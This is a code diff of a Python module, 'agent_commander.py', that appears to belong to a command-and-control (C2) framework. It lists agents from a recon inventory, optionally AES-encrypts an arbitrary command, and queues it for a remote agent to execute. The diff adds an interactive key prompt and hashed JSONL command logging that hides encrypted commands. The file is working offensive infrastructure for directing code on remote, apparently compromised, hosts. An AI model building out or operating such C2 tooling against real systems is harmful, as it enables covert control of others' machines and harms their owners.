@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# Ruta: modules/c2/agent_commander.py
+
 import os
 import json
 import argparse
@@ -6,6 +9,7 @@ import base64
 import hashlib
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
+from getpass import getpass
 
 AGENT_PATH = "recon/agent_inventory.json"
 QUEUE_DIR = "c2/queues"
@@ -22,8 +26,11 @@ def load_agents():
         return json.load(f)
 
 def list_agents(agents):
+    print("\n[+] Available Agents:")
     for idx, (agent, data) in enumerate(agents.items(), 1):
-        print(f"{idx}. {agent} ({data.get('ip', 'unknown')})")
+        ip = data.get("ip", "unknown")
+        osinfo = data.get("os", "unknown")
+        print(f" {idx}. {agent} - {ip} - {osinfo}")
 
 def encrypt_command(command, key):
     key_bytes = hashlib.sha256(key.encode()).digest()
@@ -33,34 +40,45 @@ def encrypt_command(command, key):
     encrypted = base64.b64encode(iv + ct_bytes).decode()
     return encrypted
 
-def write_command(agent, command, encrypted=False):
-    fname = os.path.join(QUEUE_DIR, f"{agent}.queue")
-    with open(fname, "a") as f:
+def hash_command(command):
+    return hashlib.sha256(command.encode()).hexdigest()
+
+def write_command(agent, command, original_cmd, encrypted=False):
+    queue_file = os.path.join(QUEUE_DIR, f"{agent}.queue")
+    with open(queue_file, "a") as f:
         f.write(command + "\n")
 
-    logname = f"{LOG_DIR}/c2_commands_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.log"
-    with open(logname, "a") as f:
-        f.write(f"{datetime.datetime.now().isoformat()} - {agent} - {command}\n")
+    log_entry = {
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "agent": agent,
+        "encrypted": encrypted,
+        "command_hash": hash_command(original_cmd),
+        "raw_command": "[ENCRYPTED]" if encrypted else original_cmd
+    }
+
+    log_file = os.path.join(LOG_DIR, f"c2_commands_{datetime.datetime.utcnow().strftime('%Y%m%d')}.jsonl")
+    with open(log_file, "a") as f:
+        f.write(json.dumps(log_entry) + "\n")
 
 def main():
-    parser = argparse.ArgumentParser(description="Send command to remote agent")
+    parser = argparse.ArgumentParser(description="Send command to C2 agent")
     parser.add_argument("--agent", help="Agent ID (from inventory)")
     parser.add_argument("--cmd", help="Command to execute")
-    parser.add_argument("--encrypt", action="store_true", help="Encrypt command with AES key")
-    parser.add_argument("--list", action="store_true", help="List available agents")
+    parser.add_argument("--encrypt", action="store_true", help="Encrypt command with AES")
+    parser.add_argument("--list", action="store_true", help="List agents")
 
     args = parser.parse_args()
     agents = load_agents()
 
     if args.list:
         if not agents:
-            print("[!] No agents found.")
+            print("[!] No agents found in inventory.")
             return
         list_agents(agents)
         return
 
     if not args.agent or not args.cmd:
-        print("[!] --agent and --cmd are required unless using --list")
+        print("[!] Both --agent and --cmd are required unless using --list.")
         return
 
     if args.agent not in agents:
@@ -68,15 +86,17 @@ def main():
         return
 
     final_cmd = args.cmd
+    encrypted = False
+
     if args.encrypt:
         key = os.environ.get(KEY_ENV)
         if not key:
-            print(f"[!] AES key not found. Set env variable: {KEY_ENV}")
-            return
+            key = getpass(f"Enter AES key for encryption (or set env {KEY_ENV}): ")
         final_cmd = encrypt_command(args.cmd, key)
+        encrypted = True
 
-    write_command(args.agent, final_cmd)
-    print(f"[+] Command sent to agent: {args.agent}")
+    write_command(args.agent, final_cmd, args.cmd, encrypted=encrypted)
+    print(f"[+] Command sent to agent '{args.agent}' successfully.")
 
 if __name__ == "__main__":
     main()
